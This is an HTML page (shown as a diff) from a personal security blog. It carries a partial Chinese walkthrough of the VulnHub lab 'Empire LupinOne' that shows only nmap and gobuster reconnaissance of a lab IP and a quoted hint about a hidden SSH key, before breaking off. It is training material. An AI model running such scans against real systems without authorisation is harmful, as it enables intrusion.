+    <meta property="article:published_time" content="2026-03-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-11T22:27:33+08:00">
+
+
+  <meta itemprop="name" content="Empire lupinone">
+  <meta itemprop="description" content="一、信息搜集#1.1 端口扫描#┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.174.132 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA) | 256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA) |_ 256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) | http-robots.txt: 1 disallowed entry |_/~myfiles |_http-server-header: Apache/2.4.48 (Debian) |_http-title: Site doesn&#39;t have a title (text/html). MAC Address: 00:0C:29:0D:71:11 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel接着访问80端口、robots.txt、/~myfiles
+robots.txt：
+User-agent: * Disallow: /~myfiles/~myfiles：
+&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Error 404&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Error 404&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &lt;!-- Your can do it, keep trying. --&gt;什么也没有发现，但根据提示，有文件是/~文件名这种格式的，因此思路是目录扫描再找类似的文件">
+  <meta itemprop="datePublished" content="2026-03-11T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-03-11T22:27:33+08:00">
+  <meta itemprop="wordCount" content="479">
+
+<title>Empire lupinone | vnccer</title>
+<link rel="icon" href="/ak47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/">
+<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.dbfdb659412a555a77ef5b04999942f4b716ee27fac91f83a3f7534110ecff57.js" integrity="sha256-2/22WUEqVVp371sEmZlC9LcW7if6yR&#43;Do/dTQRDs/1c=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8930de0c5beda9ae1324d8e974f81d1e" class="toggle" checked />
+    <label for="section-8930de0c5beda9ae1324d8e974f81d1e" class="flex">
+      <a href="/docs/cybersecurity/" class="">
+        网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-755697504a2fe68087c290f83d929a6c" class="toggle"  />
+    <label for="section-755697504a2fe68087c290f83d929a6c" class="flex">
+      <a role="button" class="">
+        DVWA</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/DVWA/" class="">
+      DVWA全难度</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-440df364fda34dee6eb8dbb8bf54c0be" class="toggle"  />
+    <label for="section-440df364fda34dee6eb8dbb8bf54c0be" class="flex">
+      <a role="button" class="">
+        Vulnerabilities</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
+      基于docker的log4j2（CVE-2021-44228）漏洞（失败）</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/log4j2.8.1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="">
+      Log4j2.8.1漏洞复现</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0a2f5b9129642a4909478fdeb2bc202e" class="toggle" checked />
+    <label for="section-0a2f5b9129642a4909478fdeb2bc202e" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-503a003a1f0020ea9e857111fe72b746" class="toggle"  />
+    <label for="section-503a003a1f0020ea9e857111fe72b746" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-ICA_1/" class="">
+      ICA: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fbe66aa168d91291660fa4890e0caf96" class="toggle" checked />
+    <label for="section-fbe66aa168d91291660fa4890e0caf96" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/" class="active">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-44d06050e861867b08816ac7b41bc098" class="toggle"  />
+    <label for="section-44d06050e861867b08816ac7b41bc098" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ccb82f673039402d87957a0215871d7" class="toggle"  />
+    <label for="section-6ccb82f673039402d87957a0215871d7" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e0d169006dece34d6002b6d9d8f8c6d8" class="toggle"  />
+    <label for="section-e0d169006dece34d6002b6d9d8f8c6d8" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="">
+      web-low</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ecffae0aff6917133e7910d8ae47ce6" class="toggle"  />
+    <label for="section-6ecffae0aff6917133e7910d8ae47ce6" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-92481376b3688992fd4bd02f22611062" class="toggle"  />
+    <label for="section-92481376b3688992fd4bd02f22611062" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="toggle"  />
+    <label for="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="flex">
+      <a href="/docs/papers/" class="">
+        论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT/" class="">
+      ET-BERT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
+      ET-BERT复现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E7%AA%81%E5%8F%91%E7%89%B9%E5%BE%81%E8%AF%8D%E5%85%83%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于突发特征词元自学习的未知加密恶意流量检测方法</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0322fd2da3e27f54e6647ac98dce6412" class="toggle"  />
+    <label for="section-0322fd2da3e27f54e6647ac98dce6412" class="flex">
+      <a href="/docs/skills/" class="">
+        技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/kali-linux/" class="">
+      kali linux基础</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win-&#43;-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win &#43; r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali-linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
+      基于vmware的kali linux下的docker部署(坑多)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
+      网站构建</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-46cca3cee31003e60d06ca1be37ae652" class="toggle"  />
+    <label for="section-46cca3cee31003e60d06ca1be37ae652" class="flex">
+      <a href="/docs/navigation/" class="">
+        导航门户</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E9%9D%B6%E5%9C%BA/" class="">
+      靶场</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
+      论文</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
+      工作</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Function/" class="">
+      Function</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/AI/" class="">
+      AI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Life/" class="">
+      Life</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B9%B3%E5%8F%B0/" class="">
+      平台</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
+      机场</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Empire lupinone</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一信息搜集">一、信息搜集</a>
+      <ul>
+        <li><a href="#11-端口扫描">1.1 端口扫描</a></li>
+        <li><a href="#12-目录扫描">1.2 目录扫描</a></li>
+      </ul>
+    </li>
+    <li><a href="#二信息解密和爆破">二、信息解密和爆破</a></li>
+    <li><a href="#三ssh登录">三、SSH登录</a></li>
+    <li><a href="#四水平越权">四、水平越权</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#41-找漏洞">4.1 找漏洞</a></li>
+            <li><a href="#42-漏洞利用文件源码中添加命令行">4.2 漏洞利用：文件源码中添加命令行</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#五提权">五、提权</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="一信息搜集">一、信息搜集<a class="anchor" href="#%e4%b8%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86">#</a></h1>
+<h2 id="11-端口扫描">1.1 端口扫描<a class="anchor" href="#11-%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sS -sV -sC -T4 192.168.174.132
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian <span style="color:#ff9f43">5</span> <span style="color:#ff6ac1">(</span>protocol 2.0<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ff9f43">3072</span> ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 <span style="color:#ff6ac1">(</span>RSA<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ff9f43">256</span> bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 <span style="color:#ff6ac1">(</span>ECDSA<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ff9f43">256</span> ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f <span style="color:#ff6ac1">(</span>ED25519<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.48 <span style="color:#ff6ac1">((</span>Debian<span style="color:#ff6ac1">))</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ff9f43">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/~myfiles
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.48 <span style="color:#ff6ac1">(</span>Debian<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#ff5c57">&#39;</span>t have a title <span style="color:#ff6ac1">(</span>text/html<span style="color:#ff6ac1">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:0D:71:11 <span style="color:#ff6ac1">(</span>VMware<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div><p>接着访问80端口、robots.txt、/~myfiles</p>
+<p>robots.txt：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>User-agent: *
+</span></span><span style="display:flex;"><span>Disallow: /~myfiles</span></span></code></pre></div><p>/~myfiles：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span><span style="color:#78787e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">title</span>&gt;Error 404&lt;/<span style="color:#ff6ac1">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff6ac1">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">h1</span>&gt;Error 404&lt;/<span style="color:#ff6ac1">h1</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff6ac1">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff6ac1">html</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">&lt;!-- Your can do it, keep trying. --&gt;</span></span></span></code></pre></div><p>什么也没有发现，但根据提示，有文件是<code>/~文件名</code>这种格式的，因此思路是目录扫描再找类似的文件</p>
+<h2 id="12-目录扫描">1.2 目录扫描<a class="anchor" href="#12-%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f">#</a></h2>
+<p><code>dirb http://192.168.174.132</code>，结果混乱，因此转用gobuster
 第一个命令快速摸底，common字典约4600行；
 第二个命令慢，directory-list-2.3-medium.txt字典约220000行；
-第三个命令最慢，还叠加上各种后缀进行扫描。</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirb/common.txt
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style=color:#a5d6ff>50</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style=color:#a5d6ff>50</span> -x txt,php,bak,html</span></span></code></pre></div><p>然而实则都不行，因为上面是<code>URL/字典词</code>这样的形式，我们需要的是<code>/~字典词语</code>这样的目录扫描</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>gobuster fuzz -u http://192.168.174.132/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>gobuster fuzz -u http://192.168.174.132/~FUZZ -w /usr/share/wordlists/dirb/common.txt</span></span></code></pre></div><p>结果也不行，估计是字典原因，干脆直接抄攻略的<code>/~secret</code>，内容如下：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span>Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>I&#39;m smart I know that.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>Any problem let me know
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>Your best friend icex64
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>你好，朋友，很高兴你找到了我的秘密文件，我创建了这样一个，想和你分享我的创建SSH私钥文件，
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>它藏在这里某处，这样黑客就找不到它，也不会用Fasttrack破解我的密码。
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>我很聪明，我知道。
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>有任何问题告诉我
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>你最好的朋友 icex64</span></span></code></pre></div><p>根据提示，猜测账户名为<code>icex64</code>，需要用fasttrack破解他的密钥，猜测这里存在文件放了密钥，采用gobuster扫描
+第三个命令最慢，还叠加上各种后缀进行扫描。</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ff9f43">50</span>
+</span></span><span style="display:flex;"><span>gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ff9f43">50</span> -x txt,php,bak,html</span></span></code></pre></div><p>然而实则都不行，因为上面是<code>URL/字典词</code>这样的形式，我们需要的是<code>/~字典词语</code>这样的目录扫描</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>gobuster fuzz -u http://192.168.174.132/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span>gobuster fuzz -u http://192.168.174.132/~FUZZ -w /usr/share/wordlists/dirb/common.txt</span></span></code></pre></div><p>结果也不行，估计是字典原因，干脆直接抄攻略的<code>/~secret</code>，内容如下：</p>
+<pre tabindex="0"><code>Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,
+Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
+I&#39;m smart I know that.
+Any problem let me know
+Your best friend icex64
+
+你好，朋友，很高兴你找到了我的秘密文件，我创建了这样一个，想和你分享我的创建SSH私钥文件，
+它藏在这里某处，这样黑客就找不到它，也不会用Fasttrack破解我的密码。
+我很聪明，我知道。
+有任何问题告诉我
+你最好的朋友 icex64</code></pre><p>根据提示，猜测账户名为<code>icex64</code>，需要用fasttrack破解他的密钥，猜测这里存在文件放了密钥，采用gobuster扫描
 <code>gobuster dir -u http://192.168.174.132/~secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,php,bak,html</code>
 扫描不出来，经过查看攻略，这文件是<code>.mysecret.txt</code>是隐藏的，因此换一个工具，<code>ffuf</code>这个模糊测试工具
